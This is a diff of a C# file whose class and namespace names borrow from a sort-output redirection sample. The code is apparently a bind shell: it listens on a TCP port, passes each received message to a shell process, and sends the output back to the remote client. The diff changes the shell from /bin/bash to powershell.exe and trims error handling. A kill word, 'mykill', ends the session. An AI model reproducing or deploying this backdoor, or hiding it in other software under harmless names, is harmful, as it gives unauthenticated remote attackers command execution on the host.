@@ -9,12 +9,10 @@ using System.Runtime.InteropServices;
 
 namespace ProcessAsyncStreamSamples
 {
-    class SortOutputRedirection
+    class SortOutputRedirection1
     {
         // Define static variables shared by class methods.
         private static StringBuilder sortOutput = null;
-        private static StringBuilder sortOutput1 = null;
-
         public static void SortInputListText(string SERVER_IP, int port)
         {
             //---listen at the specified IP and port no.---
@@ -27,21 +25,15 @@ namespace ProcessAsyncStreamSamples
             //---get the incoming data through a network stream---
             NetworkStream nwStream = client.GetStream();
             Process sortProcess = new Process();
-            sortProcess.StartInfo.FileName = "/bin/bash";
+            sortProcess.StartInfo.FileName = "powershell.exe";
             sortProcess.StartInfo.UseShellExecute = false;
             sortProcess.StartInfo.RedirectStandardOutput = true;
-            sortProcess.StartInfo.RedirectStandardError = true;
             sortOutput = new StringBuilder();
-            sortOutput1 = new StringBuilder();
             sortProcess.OutputDataReceived += SortOutputHandler;
-            sortProcess.ErrorDataReceived += SortOutputHandler1;
             sortProcess.StartInfo.RedirectStandardInput = true;
             sortProcess.Start();
-
-            var sortprocessid = sortProcess.Id;
             StreamWriter sortStreamWriter = sortProcess.StandardInput;
             sortProcess.BeginOutputReadLine();
-            sortProcess.BeginErrorReadLine();
             String inputText;
             try
             {
@@ -51,7 +43,7 @@ namespace ProcessAsyncStreamSamples
                     int bytesRead = nwStream.Read(bytesToRead, 0, client.ReceiveBufferSize);
                     Console.WriteLine("Received : " + Encoding.ASCII.GetString(bytesToRead, 0, bytesRead));
                     inputText = Encoding.ASCII.GetString(bytesToRead, 0, bytesRead);
-                    if (inputText == "mykill" || inputText == "")
+                    if (inputText == "mykill")
                     {
                         byte[] outputbuf2 = ASCIIEncoding.ASCII.GetBytes("good bye");
                         nwStream.Write(outputbuf2, 0, outputbuf2.Length);
@@ -63,43 +55,14 @@ namespace ProcessAsyncStreamSamples
                         break;
                     }
                     sortOutput.Clear();
-                    sortOutput1.Clear();
-                    try
+                    if (!String.IsNullOrEmpty(inputText))
                     {
                         sortStreamWriter.WriteLine(inputText);
-
-                    }
-                    catch
-                    {
-                        byte[] outputbuf = ASCIIEncoding.ASCII.GetBytes("good bye");
-                        nwStream.Write(outputbuf, 0, outputbuf.Length);
-                        sortStreamWriter.Close();
-                        sortProcess.WaitForExit();
-                        sortProcess.Close();
-                        client.Close();
-                        listener.Stop();
-                        break;
-                    }
-                    Thread.Sleep(1500);
-                    if (!String.IsNullOrEmpty(sortOutput.ToString()))
-                    {
-                        Console.WriteLine(sortOutput.ToString());
+                        Thread.Sleep(1500);
                         byte[] outputbuf = ASCIIEncoding.ASCII.GetBytes(sortOutput.ToString());
                         nwStream.Write(outputbuf, 0, outputbuf.Length);
                     }
-                    if (!String.IsNullOrEmpty(sortOutput1.ToString()))
-                    {
-                        Thread.Sleep(1500);
-                        Console.WriteLine(sortOutput1.ToString());
-                        byte[] outputbuf = ASCIIEncoding.ASCII.GetBytes(sortOutput1.ToString());
-                        nwStream.Write(outputbuf, 0, outputbuf.Length);
-                    }
-                    else
-                    {
-                        byte[] outputbuf = ASCIIEncoding.ASCII.GetBytes("ur command havent any output");
-                        nwStream.Write(outputbuf, 0, outputbuf.Length);
-                    }
-                    Console.WriteLine(sortOutput.ToString(), sortOutput1.ToString());
+
                 } while (true);
 
             }
@@ -123,16 +86,5 @@ namespace ProcessAsyncStreamSamples
                     $" {outLine.Data}");
             }
         }
-        private static void SortOutputHandler1(object sendingProcess,
-    DataReceivedEventArgs outLine)
-        {
-            // Collect the sort command output.
-            if (!String.IsNullOrEmpty(outLine.Data))
-            {
-                sortOutput1.Append(Environment.NewLine +
-                    $" {outLine.Data}");
-            }
-        }
     }
 }
-
